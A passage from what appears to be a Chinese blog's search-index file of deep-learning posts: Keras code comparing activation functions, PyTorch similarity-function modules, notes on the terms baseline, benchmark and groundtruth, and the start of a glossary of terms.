class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">result = []for activation in act_func:print(&#x27;\nTraining with --&gt;&#123;0&#125;&lt;-- activation function\n&#x27;.format(activation))</span><br><span class="line"></span><br><span class="line">    model = build_cnn(activation=activation,</span><br><span class="line">                      dropout_rate=0.2,</span><br><span class="line">                      optimizer=Adam(clipvalue=0.5))</span><br><span class="line"></span><br><span class="line">    history = model.fit(x_train, y_train,</span><br><span class="line">          validation_split=0.20,</span><br><span class="line">          batch_size=128, # 128 is faster, but less accurate. 16/32 recommended</span><br><span class="line">          epochs=100,</span><br><span class="line">          verbose=1,</span><br><span class="line">          validation_data=(x_test, y_test))</span><br><span class="line"></span><br><span class="line">    result.append(history)</span><br><span class="line"></span><br><span class="line">    K.clear_session()del model</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>基于此，我们可以为每个激活函数绘制从 model.fit() 得到的历史图，然后看看损失和准确度结果的变化情况。现在我们可以为数据绘图了，我用 matplotlib 写了一小段代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">new_act_arr = act_func[1:]</span><br><span class="line">new_results = result[1:]def plot_act_func_results(results, activation_functions = []):</span><br><span class="line">    plt.figure(figsize=(10,10))</span><br><span class="line">    plt.style.use(&#x27;dark_background&#x27;)# Plot validation accuracy valuesfor act_func in results:</span><br><span class="line">        plt.plot(act_func.history[&#x27;val_acc&#x27;])</span><br><span class="line"></span><br><span class="line">    plt.title(&#x27;Model accuracy&#x27;)</span><br><span class="line">    plt.ylabel(&#x27;Test Accuracy&#x27;)</span><br><span class="line">    plt.xlabel(&#x27;Epoch&#x27;)</span><br><span class="line">    plt.legend(activation_functions)</span><br><span class="line">    plt.show()# Plot validation loss values</span><br><span class="line">    plt.figure(figsize=(10,10))for act_func in results:</span><br><span class="line">        plt.plot(act_func.history[&#x27;val_loss&#x27;])</span><br><span class="line"></span><br><span class="line">    plt.title(&#x27;Model loss&#x27;)</span><br><span class="line">    plt.ylabel(&#x27;Test Loss&#x27;)</span><br><span class="line">    plt.xlabel(&#x27;Epoch&#x27;)</span><br><span class="line">    plt.legend(activation_functions)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">plot_act_func_results(new_results, new_act_arr)</span><br></pre></td></tr></table></figure><p>这会得到如下图表：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036115.jpg" alt="img"></p><p><strong>扩展阅读</strong></p><p>下面是四本写得很赞的书：</p><ul><li>Deep Learning，作者：Ian Goodfellow、Yoshua Bengio、Aaron Courville</li><li>The Hundred-Page Machine Learning Book，作者：Andriy Burkov</li><li>Hands-On Machine Learning with Scikit-Learn and TensorFlow，作者：Aurélien Géron</li><li>Machine Learning: A Probabilistic Perspective，作者：Kevin P. Murphy</li></ul><p>下面是本文讨论过的重要论文：</p><ul><li>Leaky ReLU 论文：<a href="https://link.zhihu.com/?target=https%3A//ai.stanford.edu/~amaas/papers/relu_hybrid_icml2013_final.pdf">https://ai.stanford.edu/~amaas/papers/relu_hybrid_icml2013_final.pdf</a></li><li>ELU 论文：<a href="https://link.zhihu.com/?target=https%3A//arxiv.org/pdf/1511.07289.pdf">https://arxiv.org/pdf/1511.07289.pdf</a></li><li>SELU 论文：<a href="https://link.zhihu.com/?target=https%3A//arxiv.org/pdf/1706.02515.pdf">https://arxiv.org/pdf/1706.02515.pdf</a></li><li>GELU 论文：<a href="https://link.zhihu.com/?target=https%3A//arxiv.org/pdf/1606.08415.pdf">https://arxiv.org/pdf/1606.0841</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Activation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Similarity</title>
      <link href="/2023/10/10/AILearning/DL/%E7%9B%B8%E4%BC%BC%E6%80%A7%E8%AE%A1%E7%AE%97/"/>
      <url>/2023/10/10/AILearning/DL/%E7%9B%B8%E4%BC%BC%E6%80%A7%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h4 id="cosinesimilarity">CosineSimilarity</h4><h4 id="dotproductsimilarity">DotProductSimilarity</h4><h4 id="projecteddotproductsimilarity">ProjectedDotProductSimilarity</h4><h4 id="bilinearsimilarity">BiLinearSimilarity</h4><h4 id="trilinearsimilarity">TriLinearSimilarity</h4><h4 id="multiheadedsimilarity">MultiHeadedSimilarity</h4><h2 id="1-余弦相似度"><strong>1、余弦相似度</strong></h2><p>余弦相似度用向量空间中两个向量夹角的余弦值作为衡量两个个体间差异的大小。余弦值越接近1，就表明夹角越接近0度，也就是两个向量越相似，称为&quot;余弦相似性&quot;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line">import torch.nn as nn</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line">torch.cosine_similarity()</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class CosineSimilarity(nn.Module):</span><br><span class="line"> </span><br><span class="line">    def forward(self, tensor_1, tensor_2):</span><br><span class="line">        normalized_tensor_1 = tensor_1 / tensor_1.norm(dim=-1, keepdim=True)</span><br><span class="line">        normalized_tensor_2 = tensor_2 / tensor_2.norm(dim=-1, keepdim=True)</span><br><span class="line">        return (normalized_tensor_1 * normalized_tensor_2).sum(dim=-1)</span><br></pre></td></tr></table></figure><h2 id="2-dotproductsimilarity"><strong>2、DotProductSimilarity</strong></h2><p>这个相似度函数简单地计算每对向量之间的点积，并使用可选的缩放来减少输出的方差。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class DotProductSimilarity(nn.Module):</span><br><span class="line"> </span><br><span class="line">    def __init__(self, scale_output=False):</span><br><span class="line">        super(DotProductSimilarity, self).__init__()</span><br><span class="line">        self.scale_output = scale_output</span><br><span class="line"> </span><br><span class="line">    def forward(self, tensor_1, tensor_2):</span><br><span class="line">        result = (tensor_1 * tensor_2).sum(dim=-1)</span><br><span class="line">        if self.scale_output:</span><br><span class="line">            # TODO why allennlp do multiplication at here ?</span><br><span class="line">            result /= math.sqrt(tensor_1.size(-1))</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure><h2 id="3-projecteddotproductsimilarity"><strong>3、ProjectedDotProductSimilarity</strong></h2><p>这个相似度函数做一个投影，然后计算点积，计算公式为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242052017.jpg" alt="img"></p><p>计算后的激活函数。默认为不激活。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">class ProjectedDotProductSimilarity(nn.Module):</span><br><span class="line">   </span><br><span class="line">    def __init__(self, tensor_1_dim, tensor_2_dim, projected_dim,</span><br><span class="line">                 reuse_weight=False, bias=False, activation=None):</span><br><span class="line">        super(ProjectedDotProductSimilarity, self).__init__()</span><br><span class="line">        self.reuse_weight = reuse_weight</span><br><span class="line">        self.projecting_weight_1 = nn.Parameter(torch.Tensor(tensor_1_dim, projected_dim))</span><br><span class="line">        if self.reuse_weight:</span><br><span class="line">            if tensor_1_dim != tensor_2_dim:</span><br><span class="line">                raise ValueError(&#x27;if reuse_weight=True, tensor_1_dim must equal tensor_2_dim&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            self.projecting_weight_2 = nn.Parameter(torch.Tensor(tensor_2_dim, projected_dim))</span><br><span class="line">        self.bias = nn.Parameter(torch.Tensor(1)) if bias else None</span><br><span class="line">        self.activation = activation</span><br><span class="line"> </span><br><span class="line">    def reset_parameters(self):</span><br><span class="line">        nn.init.xavier_uniform_(self.projecting_weight_1)</span><br><span class="line">        if not self.reuse_weight:</span><br><span class="line">            nn.init.xavier_uniform_(self.projecting_weight_2)</span><br><span class="line">        if self.bias is not None:</span><br><span class="line">            self.bias.data.fill_(0)</span><br><span class="line"> </span><br><span class="line">    def forward(self, tensor_1, tensor_2):</span><br><span class="line">        projected_tensor_1 = torch.matmul(tensor_1, self.projecting_weight_1)</span><br><span class="line">        if self.reuse_weight:</span><br><span class="line">            projected_tensor_2 = torch.matmul(tensor_2, self.projecting_weight_1)</span><br><span class="line">        else:</span><br><span class="line">            projected_tensor_2 = torch.matmul(tensor_2, self.projecting_weight_2)</span><br><span class="line">        result = (projected_tensor_1 * projected_tensor_2).sum(dim=-1)</span><br><span class="line">        if self.bias is not None:</span><br><span class="line">            result = result + self.bias</span><br><span class="line">        if self.activation is not None:</span><br><span class="line">            result = self.activation(result)</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure><h2 id="4-bilinearsimilarity"><strong>4、BiLinearSimilarity</strong></h2><p>此相似度函数执行两个输入向量的双线性变换。这个函数有一个权重矩阵“W”和一个偏差“b”，以及两个向量之间的相似度，计算公式为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242052018.jpg" alt="img"></p><p>计算后的激活函数。 默认为不激活。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class BiLinearSimilarity(nn.Module):</span><br><span class="line"> </span><br><span class="line">    def __init__(self, tensor_1_dim, tensor_2_dim, activation=None):</span><br><span class="line">        super(BiLinearSimilarity, self).__init__()</span><br><span class="line">        self.weight_matrix = nn.Parameter(torch.Tensor(tensor_1_dim, tensor_2_dim))</span><br><span class="line">        self.bias = nn.Parameter(torch.Tensor(1))</span><br><span class="line">        self.activation = activation</span><br><span class="line">        self.reset_parameters()</span><br><span class="line"> </span><br><span class="line">    def reset_parameters(self):</span><br><span class="line">        nn.init.xavier_uniform_(self.weight_matrix)</span><br><span class="line">        self.bias.data.fill_(0)</span><br><span class="line"> </span><br><span class="line">    def forward(self, tensor_1, tensor_2):</span><br><span class="line">        intermediate = torch.matmul(tensor_1, self.weight_matrix)</span><br><span class="line">        result = (intermediate * tensor_2).sum(dim=-1) + self.bias</span><br><span class="line">        if self.activation is not None:</span><br><span class="line">            result = self.activation(result)</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure><h2 id="5-trilinearsimilarity"><strong>5、TriLinearSimilarity</strong></h2><p>此相似度函数执行两个输入向量的三线性变换，计算公式为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242052183.jpg" alt="img"></p><p>计算后的激活函数。 默认为不激活。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class TriLinearSimilarity(nn.Module):</span><br><span class="line"> </span><br><span class="line">    def __init__(self, input_dim, activation=None):</span><br><span class="line">        super(TriLinearSimilarity, self).__init__()</span><br><span class="line">        self.weight_vector = nn.Parameter(torch.Tensor(3 * input_dim))</span><br><span class="line">        self.bias = nn.Parameter(torch.Tensor(1))</span><br><span class="line">        self.activation = activation</span><br><span class="line">        self.reset_parameters()</span><br><span class="line"> </span><br><span class="line">    def reset_parameters(self):</span><br><span class="line">        std = math.sqrt(6 / (self.weight_vector.size(0) + 1))</span><br><span class="line">        self.weight_vector.data.uniform_(-std, std)</span><br><span class="line">        self.bias.data.fill_(0)</span><br><span class="line"> </span><br><span class="line">    def forward(self, tensor_1, tensor_2):</span><br><span class="line">        combined_tensors = torch.cat([tensor_1, tensor_2, tensor_1 * tensor_2], dim=-1)</span><br><span class="line">        result = torch.matmul(combined_tensors, self.weight_vector) + self.bias</span><br><span class="line">        if self.activation is not None:</span><br><span class="line">            result = self.activation(result)</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure><h2 id="6-multiheadedsimilarity"><strong>6、MultiHeadedSimilarity</strong></h2><p>这个相似度函数使用多个“头”来计算相似度。也就是说，我们将输入张量投影到多个新张量中，并分别计算每个投影张量的相似度。这里的结果比典型的相似度函数多一个维度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class MultiHeadedSimilarity(nn.Module):</span><br><span class="line"> </span><br><span class="line">    def __init__(self,</span><br><span class="line">                 num_heads,</span><br><span class="line">                 tensor_1_dim,</span><br><span class="line">                 tensor_1_projected_dim=None,</span><br><span class="line">                 tensor_2_dim=None,</span><br><span class="line">                 tensor_2_projected_dim=None,</span><br><span class="line">                 internal_similarity=DotProductSimilarity()):</span><br><span class="line">        super(MultiHeadedSimilarity, self).__init__()</span><br><span class="line">        self.num_heads = num_heads</span><br><span class="line">        self.internal_similarity = internal_similarity</span><br><span class="line">        tensor_1_projected_dim = tensor_1_projected_dim or tensor_1_dim</span><br><span class="line">        tensor_2_dim = tensor_2_dim or tensor_1_dim</span><br><span class="line">        tensor_2_projected_dim = tensor_2_projected_dim or tensor_2_dim</span><br><span class="line">        if tensor_1_projected_dim % num_heads != 0:</span><br><span class="line">            raise ValueError(&quot;Projected dimension not divisible by number of heads: %d, %d&quot;</span><br><span class="line">                             % (tensor_1_projected_dim, num_heads))</span><br><span class="line">        if tensor_2_projected_dim % num_heads != 0:</span><br><span class="line">            raise ValueError(&quot;Projected dimension not divisible by number of heads: %d, %d&quot;</span><br><span class="line">                             % (tensor_2_projected_dim, num_heads))</span><br><span class="line">        self.tensor_1_projection = nn.Parameter(torch.Tensor(tensor_1_dim, tensor_1_projected_dim))</span><br><span class="line">        self.tensor_2_projection = nn.Parameter(torch.Tensor(tensor_2_dim, tensor_2_projected_dim))</span><br><span class="line">        self.reset_parameters()</span><br><span class="line"> </span><br><span class="line">    def reset_parameters(self):</span><br><span class="line">        torch.nn.init.xavier_uniform_(self.tensor_1_projection)</span><br><span class="line">        torch.nn.init.xavier_uniform_(self.tensor_2_projection)</span><br><span class="line"> </span><br><span class="line">    def forward(self, tensor_1, tensor_2):</span><br><span class="line">        projected_tensor_1 = torch.matmul(tensor_1, self.tensor_1_projection)</span><br><span class="line">        projected_tensor_2 = torch.matmul(tensor_2, self.tensor_2_projection)</span><br><span class="line"> </span><br><span class="line">        # Here we split the last dimension of the tensors from (..., projected_dim) to</span><br><span class="line">        # (..., num_heads, projected_dim / num_heads), using tensor.view().</span><br><span class="line">        last_dim_size = projected_tensor_1.size(-1) // self.num_heads</span><br><span class="line">        new_shape = list(projected_tensor_1.size())[:-1] + [self.num_heads, last_dim_size]</span><br><span class="line">        split_tensor_1 = projected_tensor_1.view(*new_shape)</span><br><span class="line">        last_dim_size = projected_tensor_2.size(-1) // self.num_heads</span><br><span class="line">        new_shape = list(projected_tensor_2.size())[:-1] + [self.num_heads, last_dim_size]</span><br><span class="line">        split_tensor_2 = projected_tensor_2.view(*new_shape)</span><br><span class="line"> </span><br><span class="line">        # And then we pass this off to our internal similarity function. Because the similarity</span><br><span class="line">        # functions don&#x27;t care what dimension their input has, and only look at the last dimension,</span><br><span class="line">        # we don&#x27;t need to do anything special here. It will just compute similarity on the</span><br><span class="line">        # projection dimension for each head, returning a tensor of shape (..., num_heads).</span><br><span class="line">        return self.internal_similarity(split_tensor_1, split_tensor_2)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>baseline、benchmark、groundtruth</title>
      <link href="/2023/10/10/AILearning/DL/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E6%9C%AF%E8%AF%ADbaseline%E3%80%81benchmark%E3%80%81groundtruth/"/>
      <url>/2023/10/10/AILearning/DL/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E6%9C%AF%E8%AF%ADbaseline%E3%80%81benchmark%E3%80%81groundtruth/</url>
      
        <content type="html"><![CDATA[<h1 id="论文阅读术语">论文阅读术语</h1><blockquote><p>baseline、benchmark、groundtruth</p></blockquote><h4 id="1-benchmark"><em><strong>1. benchmark</strong></em></h4><p>benchmark是一种评价方式。在计算机领域应用最多的就是针对不同Model的性能测试。<br>对于benchmark过程，有三个步骤：<br><strong>设置</strong>：这部分我们最常听到的就是数据集，说白了就是输入。<br>数据又分为结构化数据、半结构化数据和非结构化数据。其中非结构化数据包含各种文档、图片、视频和音频等。典型的应用有视频网站、图片相册、交通视频监控等等。<br><strong>执行</strong>：对于自己提出的模型进行试验。<br><strong>分析度量指标</strong>：<br>常用的指标：<br>（1）从架构角度度量：浮点型操作密度、整数型操作密度、指令中断、cache命中率、TLB命中；<br>（2）从Spark系统执行时间和吞吐的角度度量：Job作业执行时间、Job吞吐量、Stage执行时间、Stage吞吐量、Task执行时间、Task吞吐量；<br>（3）从Spark系统资源利用率的角度度量：CPU在指定时间段的利用率、内存在指定时间段的利用率、磁盘在指定时间段的利用率、网络带宽在指定时间段的利用率；<br>（4）从扩展性的角度度量：数据量扩展、集群节点数据扩展（scale out）、单机性能扩展（scale up）。</p><h4 id="2-baseline"><em><strong>2. baseline</strong></em></h4><p>在benchmark的第二步中，我们自己所提出的模型/算法指的就是baseline，这是我们提出的模型的基准。之后所有的改进都需要跟这个基准来比较。</p><h4 id="3-groundtruth"><em><strong>3. groundtruth</strong></em></h4><p>groundtruth:真值,针对不同的方向，真值所指代的具体内容是不同的，不过都可以理解为我们人工给定的标签。对于针对人的目标检测而言，真值代表的是数据集给定的人工标定框；而对于行为/视频分类而言，真值代表的是动作或视频的实际对应类别。总之就是实际给定的y值。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Term </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习专业术语</title>
      <link href="/2023/10/10/AILearning/DL/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/"/>
      <url>/2023/10/10/AILearning/DL/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<h4 id="激活函数activation-function">激活函数（Activation Function）</h4><p>为了让神经网络能够学习复杂的决策边界（decision boundary），我们在其一些层应用一个非线性激活函数。最常用的函数包括 sigmoid、tanh、ReLU（Rectified Linear Unit 线性修正单元） 以及这些函数的变体。</p><h4 id="adadelta">Adadelta</h4><p>Adadelta 是一个基于梯度下降的学习算法，可以随时间调整适应每个参数的学习率。它是作为 Adagrad 的改进版提出的，它比超参数（hyperparameter）更敏感而且可能会太过严重地降低学习率。Adadelta 类似于 rmsprop，而且可被用来替代 vanilla SGD。</p><p>论文：Adadelta：一种自适应学习率方法（ADADELTA: An Adaptive Learning Rate Method）<br>技术博客：斯坦福 CS231n：优化算法（<a href="http://cs231n.github.io/neural-networks-3/%EF%BC%89">http://cs231n.github.io/neural-networks-3/）</a><br>技术博客：梯度下降优化算法概述（<a href="http://sebastianruder.com/optimizing-gradient-descent/%EF%BC%89">http://sebastianruder.com/optimizing-gradient-descent/）</a></p><h4 id="adagrad">Adagrad</h4><p>Adagrad 是一种自适应学习率算法，能够随时间跟踪平方梯度并自动适应每个参数的学习率。它可被用来替代vanilla SGD (<a href="http://www.wildml.com/deep-learning-glossary/#sgd">http://www.wildml.com/deep-learning-glossary/#sgd</a>)；而且在稀疏数据上更是特别有用，在其中它可以将更高的学习率分配给更新不频繁的参数。</p><p>论文：用于在线学习和随机优化的自适应次梯度方法（Adaptive Subgradient Methods for Online Learning and Stochastic Optimization）<br>技术博客：斯坦福 CS231n：优化算法（<a href="http://cs231n.github.io/neural-networks-3/%EF%BC%89">http://cs231n.github.io/neural-networks-3/）</a><br>技术博客：梯度下降优化算法概述（<a href="http://sebastianruder.com/optimizing-gradient-descent/%EF%BC%89">http://sebastianruder.com/optimizing-gradient-descent/）</a></p><h4 id="adam">Adam</h4><p>Adam 是一种类似于 rmsprop 的自适应学习率算法，但它的更新是通过使用梯度的第一和第二时刻的运行平均值（running average）直接估计的，而且还包括一个偏差校正项。</p><p>论文：Adam：一种随机优化方法（Adam: A Method for Stochastic Optimization）<br>技术博客：梯度下降优化算法概述（<a href="http://sebastianruder.com/optimizing-gradient-descent/%EF%BC%89">http://sebastianruder.com/optimizing-gradient-descent/）</a></p><h4 id="仿射层affine-layer">仿射层（Affine Layer）</h4><p>神经网络中的一个全连接层。仿射（Affine）的意思是前面一层中的每一个神经元都连接到当前层中的每一个神经元。在许多方面，这是神经网络的「标准」层。仿射层通常被加在卷积神经网络或循环神经网络做出最终预测前的输出的顶层。仿射层的一般形式为 y = f(Wx + b)，其中 x 是层输入，w 是参数，b 是一个偏差矢量，f 是一个非线性激活函数。</p><h4 id="注意机制attention-mechanism">注意机制（Attention Mechanism）</h4><p>注意机制是由人类视觉注意所启发的，是一种关注图像中特定部分的能力。注意机制可被整合到语言处理和图像识别的架构中以帮助网络学习在做出预测时应该「关注」什么。</p><p>技术博客：深度学习和自然语言处理中的注意和记忆（<a href="http://www.wildml.com/2016/01/attention-and-memory-in-deep-learning-and-nlp/%EF%BC%89">http://www.wildml.com/2016/01/attention-and-memory-in-deep-learning-and-nlp/）</a></p><h4 id="alexnet">Alexnet</h4><p>Alexnet 是一种卷积神经网络架构的名字，这种架构曾在 2012 年 ILSVRC 挑战赛中以巨大优势获胜，而且它还导致了人们对用于图像识别的卷积神经网络（CNN）的兴趣的复苏。它由 5 个卷积层组成。其中一些后面跟随着最大池化（max-pooling）层和带有最终 1000 条路径的 softmax (1000-way softmax)的 3个全连接层。Alexnet 被引入到了使用深度卷积神经网络的 ImageNet 分类中。</p><h4 id="自编码器autoencoder">自编码器（Autoencoder）</h4><p>自编码器是一种神经网络模型，它的目标是预测输入自身，这通常通过网络中某个地方的「瓶颈（bottleneck）」实现。通过引入瓶颈，我们迫使网络学习输入更低维度的表征，从而有效地将输入压缩成一个好的表征。自编码器和 PCA 等降维技术相关，但因为它们的非线性本质，它们可以学习更为复杂的映射。目前已有一些范围涵盖较广的自编码器存在，包括 降噪自编码器（Denoising Autoencoders）、变自编码器（Variational Autoencoders）和序列自编码器（Sequence Autoencoders）。</p><p>降噪自编码器论文：Stacked Denoising Autoencoders: Learning Useful Representations in a Deep Network with a Local Denoising Criterion<br>变自编码器论文：Auto-Encoding Variational Bayes<br>序列自编码器论文：Semi-supervised Sequence Learning</p><h4 id="平均池化average-pooling">平均池化（Average-Pooling）</h4><p>平均池化是一种在卷积神经网络中用于图像识别的池化（Pooling）技术。它的工作原理是在特征的局部区域上滑动窗口，比如像素，然后再取窗口中所有值的平均。它将输入表征压缩成一种更低维度的表征。</p><h4 id="反向传播backpropagation">反向传播（Backpropagation）</h4><p>反向传播是一种在神经网络中用来有效地计算梯度的算法，或更一般而言，是一种前馈计算图（feedforward computational graph）。其可以归结成从网络输出开始应用分化的链式法则，然后向后传播梯度。反向传播的第一个应用可以追溯到 1960 年代的 Vapnik 等人，但论文 Learning representations by back-propagating errors常常被作为引用源。</p><p>技术博客：计算图上的微积分学：反向传播（<a href="http://colah.github.io/posts/2015-08-Backprop/%EF%BC%89">http://colah.github.io/posts/2015-08-Backprop/）</a></p><h4 id="通过时间的反向传播bpttbackpropagation-through-time">通过时间的反向传播（BPTT：Backpropagation Through Time）</h4><p>通过时间的反向传播是应用于循环神经网络（RNN）的反向传播算法。BPTT 可被看作是应用于 RNN 的标准反向传播算法，其中的每一个时间步骤（time step）都代表一个计算层，而且它的参数是跨计算层共享的。因为 RNN 在所有的时间步骤中都共享了同样的参数，一个时间步骤的错误必然能「通过时间」反向到之前所有的时间步骤，该算法也因而得名。当处理长序列（数百个输入）时，为降低计算成本常常使用一种删节版的 BPTT。删节的 BPTT 会在固定数量的步骤之后停止反向传播错误。</p><p>论文：Backpropagation Through Time: What It Does and How to Do It</p><h4 id="分批标准化bnbatch-normalization">分批标准化（BN：Batch Normalization）</h4><p>分批标准化是一种按小批量的方式标准化层输入的技术。它能加速训练过程，允许使用更高的学习率，还可用作规范器（regularizer）。人们发现，分批标准化在卷积和前馈神经网络中应用时非常高效，但尚未被成功应用到循环神经网络上。</p><p>论文：分批标准化：通过减少内部协变量位移（Covariate Shift）加速深度网络训练（Batch Normalization: Accelerating Deep Network Training by Reducing Internal Covariate Shift）<br>论文：使用分批标准化的循环神经网络（Batch Normalized Recurrent Neural Networks）</p><h4 id="双向循环神经网络bidirectional-rnn">双向循环神经网络（Bidirectional RNN）</h4><p>双向循环神经网络是一类包含两个方向不同的 RNN 的神经网络。其中的前向 RNN 从起点向终点读取输入序列，而反向 RNN 则从终点向起点读取。这两个 RNN 互相彼此堆叠，它们的状态通常通过附加两个矢量的方式进行组合。双向 RNN 常被用在自然语言问题中，因为在自然语言中我们需要同时考虑话语的前后上下文以做出预测。</p><p>论文：双向循环神经网络（Bidirectional Recurrent Neural Networks）</p><h4 id="caffe">Caffe</h4><p>Caffe 是由伯克利大学视觉和学习中心开发的一种深度学习框架。在视觉任务和卷积神经网络模型中，Caffe 格外受欢迎且性能优异。</p><h4 id="分类交叉熵损失categorical-cross-entropy-loss">分类交叉熵损失（Categorical Cross-Entropy Loss）</h4><p>分类交叉熵损失也被称为负对数似然（negative log likelihood）。这是一种用于解决分类问题的流行的损失函数，可用于测量两种概率分布（通常是真实标签和预测标签）之间的相似性。它可用 L = -sum(y * log(y_prediction)) 表示，其中 y 是真实标签的概率分布（通常是一个one-hot vector），y_prediction 是预测标签的概率分布，通常来自于一个 softmax。</p><h4 id="信道channel">信道（Channel）</h4><p>深度学习模型的输入数据可以有多个信道。图像就是个典型的例子，它有红、绿和蓝三个颜色信道。一个图像可以被表示成一个三维的张量（Tensor），其中的维度对应于信道、高度和宽度。自然语言数据也可以有多个信道，比如在不同类型的嵌入（embedding）形式中。</p><h4 id="卷积神经网络cnnconvnetconvolutional-neural-network">卷积神经网络（CNN/ConvNet：Convolutional Neural Network）</h4><p>CNN 使用卷积连接从输入的局部区域中提取的特征。大部分 CNN 都包含了卷积层、池化层和仿射层的组合。CNN 尤其凭借其在视觉识别任务的卓越性能表现而获得了普及，它已经在该领域保持了好几年的领先。</p><p>技术博客：斯坦福CS231n类——用于视觉识别的卷积神经网络（<a 